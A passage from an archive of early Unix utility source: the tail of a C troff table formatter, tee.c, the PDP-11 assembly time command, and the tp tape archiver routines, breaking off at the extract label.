					newtab[nlin]=newtab[nlin+1]=1;
				}
			else
				tabentry[nlin][++icol] = 0;
		while (span(style[icol+1],nlin) )
			tabentry[nlin][++icol] = "";
		if (ch == '\0') break;
		}
	while (++icol <ncol)
		tabentry[nlin][icol] = "";
	while (*cstore != '\0')
		 *cstore++;
	if (cstore-cspace > MAXCHS)
		cstore = cspace  = getvec(MAXCHS+100);
	}
/* find longest command string */
for (icol=maxchnge=0; icol<ncol; icol++)
	if (slen(style[icol]) >maxchnge)
		maxchnge = slen(style[icol]);
/* set tab stops */
printf(".nr 49 0\n");
for (icol = 0; icol<ncol; icol++)
	{
	ct = 1 + (icol>0 ? sep[icol-1] : 0);
	printf(".nr %2d 0\n", icol+50);
	for (ilin=0; ilin < nlin; ilin++)
		{
		if (icol>0 && dwide[icol-1]>0 && tabentry[ilin][icol]==0)
			{
			printf(".nr 48 \\n(%2d+\\w'%s'+%dn\n",
				icol+48, tabentry[ilin][icol-1], sep[icol-1]);
			printf(".if \\n(48-\\n(%2d .nr %2d \\n(48\n",
				icol+50,icol+50);
			}
		if ( !span(style[icol],ilin) && /* not part of span */
		   (dwide[icol] == 0 || tabentry[ilin][icol+1]!= 0)
				/* not a double item */
		     && (!span(style[icol+1],ilin) || icol==ncol))
			{
			printf(".nr 47 \\n(%2d+\\w'%s'+%dn\n",
			icol+49,tabentry[ilin][icol], ct);
			printf(".if \\n(47-\\n(%2d .nr %2d \\n(47\n",
				icol+50,icol+50);
			}
		}
	/* clean up spanned headings */
	for(ilin=0; ilin<maxchnge; ilin++)
		{
		if( !(span(style[icol],ilin)) &&
		  (icol ==1 || dwide[icol-1] == 0) &&
		  span(style[icol+(dwide[icol]?2:1)],ilin))
			printf(".nr %d \\n(%2d+\\w'%s'+%dn\n",
			  ilin+30, icol+49, tabentry[ilin][icol], ct);
		else if (span(style[icol],ilin) &&
		  (icol+1==ncol || !span(style[icol+1],ilin)))
			printf(".if \\n(%d-\\n(%d .nr %d \\n(%d\n",
				30+ilin, icol+50, icol+50, ilin+30);
		}
	}
/* run out table, put field characters in */
printf (".fc  @\n");
for (ilin=0; ilin<nlin; ilin++)
	{
	if (instead[ilin])
		{
		printf("%s\n",instead[ilin]);
		continue;
		}
	/* is a new set of tab stops needed */
	if (ilin < maxchnge || newtab[ilin])
		settab(ncol, ilin);
	for (icol=0; icol<ncol; icol++)
		{
		switch ( ylet(style[icol],ilin))
			{
			default:
			case 'L': case 'l':
				format = "%s@"; break;
			case 'R': case 'r':
				format= "@%s"; break;
			case 'n': case 'N':
				if (!dwide[icol] || tabentry[ilin][icol+1] != 0)
					{
					format=dwide[icol]? "@%s" : "%s@";
					break;
					}
			case 'c': case 'C':
				format = "@%s@"; break;
			case 's':  case 'S':
				format= "";
				break;
			}
		if (! (dwide [icol-1]>0 && tabentry[ilin][icol] == 0 ))
		printf(format, tabentry[ilin][icol]);
		if (!span(style[icol+1],ilin))
			for (k=sep[icol]; k>0; k--)
				printf(" ");
		}
	printf("\n");
	}
printf(".fc\n");
printf(".TE\n");
}
match (s1, s2)
	char *s1, *s2;
{
	while (*s1 == *s2)
		if (*s1++ == '\0')
			return(1);
		else
			*s2++;
	return(0);
}
slen(str)
	char *str;
{
	int k;
	for (k=0; *str++ != '\0'; k++);
	return(k);
}
space(ch)
	{
	switch (ch)
		{
		case ' ': case '\t':
			return(1);
	}
	return(0);
	}
letter (ch)
	{
	if (ch >= 'a' && ch <= 'z')
		return(1);
	if (ch >= 'A' && ch <= 'Z')
		return(1);
	return(0);
	}
numb(str)
	char *str;
	{
	/* convert to integer */
	int k;
	for (k=0; *str >= '0' && *str <= '9'; str++)
		k = k*10 + *str - '0';
	return(k);
	}
broken(str, nlin)
	{
	switch(ylet(str,nlin))
		{
		case 'n': case 'N':
			return(1);
		}
	return(0);
	}
ylet (str, k)
	char *str;
{
	k++;
	while (*str &&k--)
		str++;
	return(*--str);
}
span(str, k)
	{
	switch(ylet(str,k))
		{
		case 's': case 'S':
			return(1);
		}
	return(0);
	}
maknew(str)
	char *str;
{
	/* make two numerical fields */
	int point;
	char *p, *q;
	p = str;
	for (point=0; *str; str++)
		if (*str=='.')
			point=1;
	if (!point && *(str-1)== '$')
		return(0);
	for(; str>p; str--)
		if ( (point && *str == '.') ||
		    (!point && digit(*(str-1)) ) )
			break;
	if (!point && p==str) /* not numerical, don't split */
		return(0);
	p= str;
	q = exstore;
	while (*exstore++ = *str++);
	*p = 0;
	return(q);
	}
digit(x)
	{
	return(x>= '0' && x<= '9');
	}
settab(ncol, ilin)
{
	int k, icol;
	printf(".ta ");
	for (icol = 0; icol<ncol; icol++)
	   if ((dwide[icol] == 0 || tabentry[ilin][icol+1] != 0)
		&& !span(style[icol+1],ilin))
		printf("\\n(%du ",icol+50);
	printf("\n");
}
-- /usr/source/s2/tee.c mode=0100664 uid=3 gid=3 atime=174923765 mtime=169260600 --
int open[9] { 1 };
int n 1;
int t 0;

char in[512];

char out[512];

main(argc,argv)
char **argv;
{
	int register r,w,p;
	struct { int x1[2], type, x2[15]; } buf;
	fstat(1,&buf);
	t = (buf.type&060000)==020000;
	while(argc-->1) {
		open[n++] = creat(argv[1],0666);
		if(stat(argv[1],&buf)>=0)
			if((buf.type&060000)==020000)
				t++;
		argv++;
	}
	r = w = 0;
	for(;;) {
		for(p=0;p<512;) {
			if(r>=w) {
				if(t>0&&p>0) break;
				w = read(0,in,512);
				r = 0;
				if(w<=0) {
					stash(p);
					return;
				}
			}
			out[p++] = in[r++];
		}
		stash(p);
	}
}

stash(p)
{
	int k;
	int i;
	int d;
	d = t ? 10 : p;
	for(i=0; i<p; i=+d)
		for(k=0;k<n;k++)
			write(open[k], out+i, d<p-i?d:p-i);
}
-- /usr/source/s2/time.s mode=0100664 uid=3 gid=3 atime=174923774 mtime=169260600 --
/ time -- prints out system times

times = 43.

	cmp	(sp),$1
	bgt	1f
	sys	exit
1:
	sys	time
	mov	r1,ltbuf
	jsr	pc,execarg
	sys	time
	sub	ltbuf,r1
	sys	times; ltbuf
	mov	r1,r0
	mul	$60.,r0
	mov	r0,ltbuf
	mov	r1,ltbuf+2
	jsr	r5,mesg; <\nreal\0>; .even
	mov	$ltbuf,r2
	jsr	r5,ptime
	jsr	r5,mesg; <user\0>; .even
	jsr	r5,ptime
	jsr	r5,mesg; <sys \0>; .even
	jsr	r5,ptime
	sys	exit

execarg:
	sys	fork
		br newproc
	bec	2f
	jsr	r5,mesg; <Try again.\n\0>; .even
	sys	exit
2:
	mov	r0,r2
	sys	signal; 2; 1
2:
	sys	wait
	cmp	r0,r2
	bne	2b
	bit	$377,r1
	beq	1f
	jsr	r5,mesg; <Command terminated abnormally.\n\0>; .even
	clr	r0
	sys	seek; 0; 2
1:
	rts	pc

newproc:
	tst	(sp)+
	mov	(sp)+,r0
	tst	(sp)+
	mov	$ibuf,r1
	mov	$end,r2
1:
	mov	(sp)+,r3
	mov	r2,(r1)+
2:
	movb	(r3)+,(r2)+
	bne	2b
	dec	r0
	cmp	r0,$1
	bgt	1b
	clr	(r1)+
	mov	$end,r1
	sys	exec; end; ibuf
	cmp	$8,r0
	beq	rcom
	mov	$end-10.,r0
	mov	$"x/,(r0)+
	mov	$"us,(r0)+
	mov	$"r/,(r0)+
	mov	$"bi,(r0)+
	mov	$"n/,(r0)+
	mov	$end-5,r1
	sys	exec; end-5; ibuf
	cmp	$8,r0
	beq	rcom
	mov	$end-9,r1
	sys	exec; end-9.; ibuf
	cmp	$8,r0
	bne	1f
rcom:
	mov	r1,ibuf
	mov	$shname+5,ibuf-2
	sys	exec ; shname ; ibuf-2
1:
	jsr	r5,mesg; <Command not found.\n\0>; .even
	clr	r0
	sys	seek; 0; 2
	sys	exit

printd:
	mov	$tbuf+4,r4
	jsr	r5,tdiv; 10.
	jsr	r5,tdiv; 10.
	jsr	r5,tdiv; 10.
	jsr	r5,tdiv; 10.
1:
	cmpb	(r4),$'0
	bne	1f
	movb	$' ,(r4)+
	cmp	r4,$tbuf+3
	bne	1b
1:
	mov	$2,r0
	sys	write; tbuf; 4
	rts	pc

ptime:
	mov	(r2)+,r0
	mov	(r2)+,r1
	div	$3600.,r0
	mov	r0,-(sp)
	clr	r0
	div	$60.,r0
	mov	r1,clicks
	mov	$tbuf+9.,r4
	jsr	r5,tdiv; 10.
	jsr	r5,tdiv; 6.
	movb	$':,-(r4)
	mov	(sp)+,r0
	jsr	r5,tdiv; 10.
	jsr	r5,tdiv; 6.
	movb	$':,-(r4)
	jsr	r5,tdiv; 10.
	jsr	r5,tdiv; 10.
	jsr	r5,tdiv; 10.
1:
	cmpb	(r4),$'0
	beq	2f
	cmpb	(r4),$':
	bne	1f
2:
	movb	$' ,(r4)+
	cmp	r4,$tbuf+8.
	bne	1b
1:
	mov	$2,r0
	sys	write; tbuf; 9.
	jsr	r5,mesg; <.\0>; .even
	mov	clicks,r1
	clr	r0
	div	$6,r0
	add	$'0,r0
	mov	r0,ch
	mov	$2,r0
	sys	write; ch; 1
	jsr	r5,mesg; <\n\0>; .even
	rts	r5

tdiv:
	mov	r1,-(sp)
	mov	r0,r1
	clr	r0
	div	(r5)+,r0
	add	$'0,r1
	movb	r1,-(r4)
	mov	(sp)+,r1
	rts	r5

mesg:
	movb	(r5)+,ch
	beq	2f
	mov	$2,r0
	sys	write; ch; 1
	br	mesg
2:
	inc	r5
	bic	$1,r5
	rts	r5

ch:	.=.+1
.even
.bss

clicks:	.=.+2
	.=.+2
ibuf:	.=.+50.
tbuf:	.=.+10.
ltbuf:	.=.+16.
end:	.=.+1000.

.data
shname:	</bin/sh\0>
.even
-- /usr/source/s2/tp1.s mode=0100664 uid=3 gid=3 atime=174923778 mtime=169260600 --
/ tap1 -- dec-disk lod/dmp

.globl	_localtime, _end
namep = 0
mode = 2
uid = 4; gid = 5
size0 = 7
size1 = 8
time0 = 10.
time1 = 12.
tapea = 14.
dirsiz = 16.
mdirent = 496.

	mov	(sp),rnarg
	mov	(sp)+,narg
	mov	$cmr,command
	incb	flu
	tst	(sp)+
	cmp	narg,$2
	bge	1f
	mov	$2,narg
	br	3f
1:
	mov	(sp)+,r0
	mov	sp,parg
1:
	movb	(r0)+,r1
	beq	3f
	mov	$swtab,r2
2:
	cmp	r1,(r2)+
	beq	2f
	tst	(r2)+
	bne	2b
	br	useerr
2:
	jsr	pc,*(r2)+
	br	1b
3:
	jsr	pc,optap
	mov	$_end,r4 / string pointer
	jsr	pc,setb
	jmp	*command

optap:
	tstb	flm
	bne	2f
	mov	$578.,tapsiz
	mov	$192.,ndirent
	sys	open; tc; 2
	br	3f
2:
	mov	$-1,tapsiz
	mov	$mdirent,ndirent
	cmp	command,$cmr
	beq	2f
	sys	open; mt; 0
	br	3f
2:
	sys	open; mt; 1
3:
	bes	1f
	mov	r0,fio
	mov	ndirent,r1
	ash	$-3,r1
	mov	r1,ndentd8
	mov	ndirent,r1
	mul	$dirsiz,r1
	add	$dir,r1
	mov	r1,edir
	rts	pc
1:
	jsr	r5,mesg
		<Tape open error\n\0>; .even
	jmp	done

setcom:
	cmp	command,$cmr
	bne	useerr
	mov	(r5)+,command
	rts	r5

noflag:
	mov	(r5)+,r0
	beq	1f
	tstb	(r0)
	beq	noflag
	br	useerr
1:
	rts	r5

useerr:
	jsr	r5,mesg
		<Bad usage\n\0>; .even
	jmp	done

swtab:
	'0; dcof
	'1; dcof
	'2; dcof
	'3; dcof
	'4; dcof
	'5; dcof
	'6; dcof
	'7; dcof
	'c; dcc
	'd; dcd
	'f; dcf
	'i; dci
	'm; dcm
	'r; dcr
	't; dct
	'u; dcu
	'v; dcv
	'w; dcw
	'x; dcx
	 0; 0

dcof:
	movb	r1,tcx
	movb	r1,mtx
	rts	pc

dcc:
	incb	flc
	rts	pc

dcf:
	incb	flf
	rts	pc

dcd:
	jsr	r5,setcom; cmd
	rts	pc

dci:
	incb	fli
	rts	pc

dcm:
	incb	flm
	rts	pc

dcu:
	incb	flu
	jsr	r5,setcom; cmr
	rts	pc

dcr:
	clrb	flu
	jsr	r5,setcom; cmr
	rts	pc

dct:
	jsr	r5,setcom; cmt
	rts	pc

dcv:
	incb	flv
	rts	pc

dcw:
	incb	flw
	rts	pc

dcx:
	jsr	r5,setcom; cmx
	rts	pc

cmd:
	jsr	r5,noflag; flm; flc; flf; 0
	cmp	narg,$2
	bgt	1f
	jmp	useerr
1:
	jsr	pc,rddir
	jsr	r5,gettape; delete
	jsr	pc,wrdir
	br	check

cmr:
	jsr	r5,noflag; 0
	tstb	flc
	bne	1f
	tstb	flm
	bne	1f
	jsr	pc,rddir
	br	2f
1:
	jsr	pc,clrdir
2:
	jsr	pc,getfiles
	jsr	pc,update
	br	check

cmt:
	jsr	r5,noflag; flc; flf; flw; 0
	jsr	pc,rddir
	tstb	flv
	beq	1f
	jsr	r5,mesg
	<   mode    uid gid tapa    size   date    time name\n\0>; .even
1:
	jsr	r5,gettape; taboc
	br	check1

cmx:
	jsr	r5,noflag; flc; flf; 0
	jsr	pc,rddir
	jsr	r5,gettape; xtract
	br	done

check:

check1:
	jsr	pc,usage

done:
	jsr	r5,mesg
		<END\n\0>; .even
	sys	exit

encode:
	mov	r2,-(sp)
	mov	r4,(r1)
	mov	(r5)+,r2
1:
	movb	(r2),(r4)+
	jsr	pc,setb
	tstb	(r2)+
	bne	1b
	mov	(sp)+,r2
	rts	r5

decode:
	mov	r2,-(sp)
	mov	r1,-(sp)
	mov	(r1),r1
	mov	(r5)+,r2
1:
	movb	(r1)+,(r2)+
	bne	1b
	mov	(sp)+,r1
	mov	(sp)+,r2
	rts	r5

setb:
	mov	r0,-(sp)
	mov	r4,r0
	add	$513.,r0
	cmp	r0,sp
	bhis	2f
	bic	$777,r0
	cmp	r0,0f
	beq	1f
	mov	r0,0f
	sys	break; 0:..
	bes	2f
1:
	mov	(sp)+,r0
	rts	pc

2:
	jsr	r5,mesg
		<Out of core\n\0>; .even
	jmp	done
-- /usr/source/s2/tp2.s mode=0110664 uid=3 gid=3 atime=174923779 mtime=169260601 --
/ tap2 -- dec-tape lod/dmp

pstr:
	movb	(r1)+,r0
	beq	1f
	jsr	pc,putc
	br	pstr
1:
	rts	pc

mesg:
	movb	(r5)+,r0
	beq	1f
	jsr	pc,putc
	br	mesg
1:
	inc	r5
	bic	$1,r5
	rts	r5

putc:
	movb	r0,ch
	mov	$1,r0
	sys	write; ch; 1
	rts	pc

getc:
	clr	r0
	sys	read; ch; 1
	movb	ch,r0
	rts	pc

clrdir:
	mov	$dir,r1
	mov	ndirent,r2
1:
	jsr	pc,clrent
	sob	r2,1b
	rts	pc

clrent:
	mov	r1,-(sp)
	add	$dirsiz,(sp)
1:
	clr	(r1)+
	cmp	r1,(sp)
	blo	1b
	tst	(sp)+
	rts	pc

rddir:
	clr	sum
	jsr	pc,clrdir
	clr	r0
	jsr	pc,rseek
	jsr	pc,tread
	mov	tapeb+510.,r0
	beq	1f
	tstb	flm
	beq	1f
	mov	r0,ndirent
1:
	mov	$dir,r1
	mov	ndirent,r2
1:
	bit	$7,r2
	bne	2f
	jsr	pc,tread
	mov	$tapeb,r3
2:
	mov	r1,-(sp)
	mov	r3,-(sp)
	mov	$32.,r0
	clr	-(sp)
2:
	add	(r3)+,(sp)
	sob	r0,2b
	bis	(sp),sum
	tst	(sp)+
	bne	2f
	mov	(sp),r3
	tst	(r3)
	beq	2f
	mov	r3,0f
	jsr	pc,9f
.data
9:
	jsr	r5,encode; 0:..
	rts	pc
.text
	add	$32.,r3
	mov	r1,-(sp)
	add	$dirsiz,(sp)
	tst	(r1)+		/ namep
9:
	mov	(r3)+,(r1)+
	cmp	r1,(sp)
	blo	9b
	tst	(sp)+
2:
	mov	(sp)+,r3
	add	$64.,r3
	mov	(sp)+,r1
	bic	$100000,mode(r1)
	add	$dirsiz,r1
	sob	r2,1b
	tst	sum
	beq	1f
	jsr	r5,mesg
		<Directory checksum\n\0>; .even
	tstb	fli
	bne	1f
	jmp	done
1:
	jsr	pc,bitmap
	rts	pc

wrdir:
	clr	r0
	jsr	pc,wseek
	tstb	flm
	bne	1f
	sys	open; tboot; 0
	bes	3f
	br	2f
1:
	sys	open; mboot; 0
	bes	3f
2:
	mov	r0,r1
	sys	read; tapeb; 512.
	mov	r1,r0
	sys	close
	mov	ndirent,tapeb+510.
3:
	jsr	pc,twrite
	mov	$dir,r1
	mov	ndirent,r2
1:
	bit	$7,r2
	bne	2f
	mov	$256.,r0
	mov	$tapeb,r3
3:
	clr	(r3)+
	sob	r0,3b
	mov	$tapeb,r3
2:
	mov	r3,-(sp)
	tst	(r1)
	beq	2f
	mov	r3,0f
	jsr	pc,9f
.data
9:
	jsr	r5,decode; 0:..
	rts	pc
.text
2:
	add	$32.,r3
	mov	r1,-(sp)
	add	$dirsiz,(sp)
	tst	(r1)+
9:
	mov	(r1)+,(r3)+
	cmp	r1,(sp)
	blo	9b
	tst	(sp)+
	mov	(sp)+,r3
	clr	-(sp)
	mov	$31.,r0
2:
	sub	(r3)+,(sp)
	sob	r0,2b
	mov	(sp)+,(r3)+
	dec	r2
	bit	$7,r2
	bne	1b
	jsr	pc,twrite
	tst	r2
	bne	1b
	rts	pc

tread:
	mov	fio,r0
	sys	read; tapeb; 512.
	bes	trderr
	cmp	r0,$512.
	bne	trderr
1:
	inc	rseeka
	rts	pc

trderr:
	jsr	r5,mesg
		<Tape read error\n\0>; .even
	tstb	fli
	beq	1f
	mov	$tapeb,r0
2:
	clr	(r0)+
	cmp	r0,$tapeb+512.
	blo	2b
	br	1b
1:
	jmp	done

twrite:
	mov	fio,r0
	sys	write; tapeb; 512.
	bes	twrerr
	cmp	r0,$512.
	bne	twrerr
	inc	wseeka
	rts	pc

twrerr:
	jsr	r5,mesg
		<Tape write error\n\0>; .even
	jmp	done

rseek:
	mov	r0,rseeka
	mov	r0,0f
	mov	fio,r0
	sys	0; 9f
.data
9:
	sys	seek; 0:..; 3
.text
	bes	seekerr
	rts	pc

wseek:
	mov	r0,-(sp)
	sub	wseeka,r0
	bge	1f
	neg	r0
1:
	cmp	r0,$25.			/ longest write seek
	ble	1f
	mov	(sp),0f
	beq	2f
	dec	0f
2:
	mov	fio,r0
	sys	0; 9f
.data
9:
	sys	seek; 0:..; 3
.text
	mov	fio,r0
	sys	read; wseeka; 1
1:
	mov	(sp),wseeka
	mov	(sp)+,0f
	mov	fio,r0
	sys	0; 9f
.data
9:
	sys	seek; 0:..; 3
.text
	bes	seekerr
	rts	pc

seekerr:
	jsr	r5,mesg
<Tape seek error\n\0>; .even
	jmp	done

verify:
	movb	(r5)+,0f
	inc	r5
	tstb	flw
	bne	1f
	tstb	flv
	beq	2f
1:
	jsr	pc,9f
.data
9:
	jsr	r5,mesg
		0:<x \0>; .even
	rts	pc
.text
	mov	r1,-(sp)
	mov	$name,r1
	jsr	pc,pstr
	mov	(sp)+,r1
	tstb	flw
	beq	1f
	jsr	r5,mesg
		< \0>
	jsr	pc,getc
	cmp	r0,$'x
	bne	3f
	jsr	pc,getc
	jmp	done
3:
	cmp	r0,$'\n
	beq	3f
	cmp	r0,$'y
	bne	4f
	jsr	pc,getc
	cmp	r0,$'\n
	beq	2f
4:
	jsr	pc,getc
	cmp	r0,$'\n
	bne	4b
	br	1b
1:
	jsr	r5,mesg
		<\n\0>
2:
	tst	(r5)+
3:
	rts	r5

getfiles:
	cmp	narg,$2
	bne	1f
	mov	$".\0,name
	jsr	pc,callout
1:
	cmp	narg,$2
	ble	1f
	dec	narg
	mov	*parg,r1
	add	$2,parg
	mov	$name,r2
2:
	movb	(r1)+,(r2)+
	bne	2b
	jsr	pc,callout
	br	1b
1:
	rts	pc

expand:
	sys	open; name; 0
	bes	fserr
	mov	r0,-(sp)
1:
	mov	(sp),r0
	sys	read; catlb; 16.
	bes	fserr
	tst	r0
	beq	1f
	tst	catlb
	beq	1b
	mov	$name,r0
	mov	$catlb+2,r1
	cmpb	(r1),$'.
	beq	1b
2:
	tstb	(r0)+
	bne	2b
	dec	r0
	mov	r0,-(sp)
	cmpb	-1(r0),$'/
	beq	2f
	movb	$'/,(r0)+
2:
	movb	(r1)+,(r0)+
	bne	2b
	jsr	pc,callout
	clrb	*(sp)+
	br	1b
1:
	mov	(sp)+,r0
	sys	close
	rts	pc

fserr:
	mov	$name,r1
	jsr	pc,pstr
	jsr	r5,mesg
		< -- Cannot open file\n\0>; .even
	jmp	done

callout:
	sys	stat; name; statb
	bes	fserr
	mov	statb+4,r0
	bic	$!60000,r0
	beq	1f
	cmp	r0,$40000
	beq	expand
	rts	pc
1:
	mov	$dir,r1
	clr	-(sp)
1:
	tst	(r1)
	bne	3f
	tst	(sp)
	bne	2f
	mov	r1,(sp)
2:
	add	$dirsiz,r1
	cmp	r1,edir
	blo	1b
	mov	(sp)+,r1
	bne	4f
	jsr	r5,mesg
		<Directory overflow\n\0>; .even
	jmp	done
4:
	jsr	r5,verify; 'a
		rts pc
	jsr	r5,encode; name
	br	2f
3:
	jsr	r5,decode; name1
	mov	$name,r2
	mov	$name1,r3
3:
	cmpb	(r2)+,(r3)
	bne	2b
	tstb	(r3)+
	bne	3b
	tst	(sp)+
	tstb	flu
	beq	3f
	cmp	time0(r1),statb+32.
	blo	3f
	bhi	1f
	cmp	time1(r1),statb+34.
	bhis	1f
3:
	jsr	r5,verify; 'r
		rts pc
2:
	mov	statb+4,mode(r1)
	bis	$100000,mode(r1)
	movb	statb+7,uid(r1)
	movb	statb+8,gid(r1)
	tstb	flf
	beq	2f
	clrb	statb+9.
	clr	statb+10.
2:
	movb	statb+9.,size0(r1)
	mov	statb+10.,size1(r1)
	mov	statb+32.,time0(r1)
	mov	statb+34.,time1(r1)
1:
	rts	pc
-- /usr/source/s2/tp3.s mode=0110664 uid=3 gid=3 atime=174923779 mtime=169260601 --
/ tap3 -- dec-tape lod/dmp

gettape:
	mov	$dir,r1
	clr	-(sp)
1:
	tst	(r1)
	beq	2f
	jsr	r5,decode; name
	cmp	rnarg,$2
	ble	4f
	mov	$name,r2
	mov	*parg,r3
3:
	tstb	(r3)
	beq	3f
	cmpb	(r2)+,(r3)+
	beq	3b
	br	2f
3:
	tstb	(r2)
	beq	4f
	cmpb	(r2),$'/
	bne	2f
4:
	mov	r1,-(sp)
	jsr	pc,*(r5)
	mov	(sp)+,r1
	inc	(sp)
2:
	add	$dirsiz,r1
	cmp	r1,edir
	blo	1b
	tst	(sp)+
	bne	2f
	cmp	rnarg,$2
	ble	2f
	mov	*parg,r1
	jsr	pc,pstr
	jsr	r5,mesg
		< not found\n\0>; .even
2:
	dec	narg
	add	$2,parg
	cmp	narg,$2
	bgt	gettape
	tst	(r5)+
	rts	r5

delete:
	jsr	r5,verify; 'd
		rts pc
	jsr	pc,clrent
	rts	pc

numb:
	mov	r1,-(sp)
	mov	r0,-(sp)
	clr	r0
	br	1f

numbx:
	mov	r1,-(sp)
	mov	r0,-(sp)
	movb	size0(r1),r0
1:
	mov	$catlb,r2
1:
	mov	$"  ,(r2)+
	cmp	r2,$catlb+12.
	blo	1b
	cmp	(r5),$2
	bne	1f
	mov	$"00,-2(r2)
1:
	mov	(sp)+,r1
	jsr	pc,numb2
	mov	(r5)+,r0
	sub	r0,r2
	mov	r2,0f
	mov	r0,0f+2
	mov	$1,r0
	sys	0; 9f
.data
9:
	sys	write; 0:..; ..
.text
	mov	(sp)+,r1
	rts	r5

numb1:
	clr	r0
numb2:
	div	$10.,r0
	mov	r1,-(sp)
	mov	r0,r1
	beq	1f
	jsr	pc,numb1
1:
	mov	(sp)+,r0
	add	$'0,r0
	movb	r0,(r2)+
	rts	pc

update:
	jsr	pc,bitmap
	mov	$dir,r1
1:
	tst	(r1)
	beq	2f
	bit	$100000,mode(r1)
	beq	2f
	tstb	size0(r1)
	bne	9f
	tst	size1(r1)
	beq	2f
9:
	mov	ndentd8,-(sp)
	inc	(sp)
	movb	size0(r1),r2
	mov	size1(r1),r3
	add	$511.,r3
	adc	r2
	ashc	$-9,r2
	mov	r3,size
3:
	mov	(sp),r2
	mov	size,r3
4:
	jsr	pc,bitcalc
	inc	r2
	bitb	(sp)+,map(r0)
	bne	4f
	sob	r3,4b
	mov	(sp)+,tapea(r1)
	jsr	pc,setmap
	br	2f
4:
	inc	(sp)
	br	3b
2:
	add	$dirsiz,r1
	cmp	r1,edir
	blo	1b
	jsr	pc,wrdir

update1:
	mov	$dir,r1
	clr	-(sp)
	mov	$-1,-(sp)
1:
	tst	(r1)
	beq	2f
	bit	$100000,mode(r1)
	beq	2f
	cmp	tapea(r1),(sp)
	bhis	2f
	mov	tapea(r1),(sp)
	mov	r1,2(sp)
2:
	add	$dirsiz,r1
	cmp	r1,edir
	blo	1b
	tst	(sp)+
	mov	(sp)+,r1
	bne	1f
	rts	pc
1:
	bic	$100000,mode(r1)
	movb	size0(r1),mss
	mov	size1(r1),r2
	bne	4f
	tst	mss
	beq	update1
4:
	jsr	r5,decode; name
	mov	tapea(r1),r0
	jsr	pc,wseek
	clr	r3
	sys	open; name; 0
	bes	phserr
	mov	r0,r3
3:
	tst	mss
	bne	4f
	cmp	r2,$512.
	blo	3f
4:
	mov	r3,r0
	sys	read; tapeb; 512.
	bes	phserr
	cmp	r0,$512.
	bne	phserr
	jsr	pc,twrite
	sub	$512.,r2
	sbc	mss
	br	3b
3:
	mov	r2,0f
	beq	3f
	mov	r3,r0
	sys	0; 9f
.data
9:
	sys	read; tapeb; 0:..
.text
	bes	phserr
	cmp	r0,0b
	bne	phserr
	jsr	pc,twrite
3:
	mov	r3,r0
	sys	read; tapeb; 512.
	bes	phserr
	tst	r0
	bne	phserr
	mov	r3,r0
	sys	close
2:
	jmp	update1

phserr:
	mov	r1,-(sp)
	mov	$name,r1
	jsr	pc,pstr
	jsr	r5,mesg
		< -- Phase error\n\0>; .even
	mov	(sp)+,r1
	clr	time0(r1) / time
	beq	2b
	sys	close
	br	2b

bitmap:
	mov	$map,r0
1:
	clr	(r0)+
	cmp	r0,$emap
	blo	1b
	mov	$dir,r1
1:
	tst	(r1)
	beq	2f
	bit	$100000,mode(r1)
	bne	2f
	tst	size1(r1)
	bne	3f
	tstb	size0(r1)
	beq	2f
3:
	jsr	pc,setmap
2:
	add	$dirsiz,r1
	cmp	r1,edir
	blo	1b
	rts	pc

setmap:
	movb	size0(r1),r2
	mov	size1(r1),r3
	add	$511.,r3
	adc	r2
	ashc	$-9.,r2
	mov	tapea(r1),r2
1:
	jsr	pc,bitcalc
	bitb	(sp),map(r0)
	bne	maperr
	bisb	(sp)+,map(r0)
	inc	r2
	sob	r3,1b
	rts	pc

bitcalc:
	mov	(sp),-(sp)
	cmp	r2,tapsiz
	bhis	maperr
	mov	r2,r0
	bic	$!7,r0
	mov	r0,-(sp)
	mov	$1,r0
	als	(sp)+,r0
	mov	r0,2(sp)
	mov	r2,r0
	ash	$-3,r0
	bic	$160000,r0
	rts	pc

maperr:
	jsr	r5,mesg
		<Tape overflow\n\0>; .even
	jmp	done

usage:
	jsr	pc,bitmap
	mov	$dir,r2
1:
	tst	(r2)
	beq	2f
	inc	nentr
2:
	add	$dirsiz,r2
	cmp	r2,edir
	blo	1b
	mov	ndentd8,r2
	inc	r2
	mov	tapsiz,r3
	dec	r3
	sub	ndentd8,r3
1:
	jsr	pc,bitcalc
	bitb	(sp)+,map(r0)
	beq	2f
	inc	nused
	mov	r2,lused
	br	3f
2:
	inc	nfree
	tstb	flm
	bne	1f
3:
	inc	r2
	sob	r3,1b
1:
	mov	nentr,r0
	jsr	r5,numb; 4
	jsr	r5,mesg
		< entries\n\0>; .even
	mov	nused,r0
	jsr	r5,numb; 4
	jsr	r5,mesg
		< used\n\0>; .even
	tstb	flm
	bne	1f
	mov	nfree,r0
	jsr	r5,numb; 4
	jsr	r5,mesg
		< free\n\0>; .even
1:
	mov	lused,r0
	jsr	r5,numb; 4
	jsr	r5,mesg
		< last\n\0>; .even
	rts	pc

taboc:
	tstb	flv
	beq	4f
	mov	mode(r1),r0
	mov	r0,-(sp)
	ash	$-6,r0
	bit	$40,r0
	jsr	pc,pmod
	mov	(sp),r0
	ash	$-3,r0
	bit	$200,r0
	jsr	pc,pmod
	mov	(sp)+,r0
	bit	$1000,r0
	jsr	pc,pmod
	clr	r0
	bisb	uid(r1),r0
	jsr	r5,numb; 4
	clr	r0
	bisb	gid(r1),r0
	jsr	r5,numb; 4
	mov	tapea(r1),r0
	jsr	r5,numb; 5
	mov	size1(r1),r0
	jsr	r5,numbx; 9.
	mov	r1,-(sp)
	add	$time0,(sp)
	jsr	pc,_localtime
	mov	r0,(sp)
	mov	10.(r0),r0
	jsr	r5,numb; 3
	mov	$'/,r0
	jsr	pc,putc
	mov	(sp),r0
	mov	8.(r0),r0
	inc	r0
	jsr	r5,numb; 2
	mov	$'/,r0
	jsr	pc,putc
	mov	(sp),r0
	mov	6(r0),r0
	jsr	r5,numb; 2
	mov	(sp),r0
	mov	4(r0),r0
	jsr	r5,numb; 3
	mov	$':,r0
	jsr	pc,putc
	mov	(sp)+,r0
	mov	2(r0),r0
	jsr	r5,numb; 2
	mov	$' ,r0
	jsr	pc,putc
4:
	mov	$name,r1
	jsr	pc,pstr
	jsr	r5,mesg
		<\n\0>
	rts	pc

pmod:
	beq	1f
	mov	$'s,-(sp)
	br	2f
1:
	bit	$1,r0
	beq	1f
	mov	$'x,-(sp)
	br	2f
1:
	mov	$'-,-(sp)
2:
	bit	$2,r0
	beq	1f
	mov	$'w,-(sp)
	br	2f
1:
	mov	$'-,-(sp)
2:
	bit	$4,r0
	beq	1f
	mov	$'r,r0
	br	2f
1:
	mov	$'-,r0
2:
	jsr	pc,putc
	mov	(sp)+,r0
	jsr	pc,putc
	mov	(sp)+,r0
	jsr	pc,putc
	rts	pc

xtract:
